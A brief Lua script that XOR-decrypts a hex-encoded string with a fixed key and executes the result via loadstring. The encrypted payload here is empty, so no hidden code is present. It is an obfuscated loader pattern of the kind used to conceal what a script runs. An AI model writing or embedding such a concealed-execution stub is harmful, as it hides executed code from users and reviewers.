local k={218,18,75,5,73,36,182,20,91,195,144,231,223,10,200,24,194,141,177,82,133,13,98,40,211,252,50,196,180,22,105,196}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
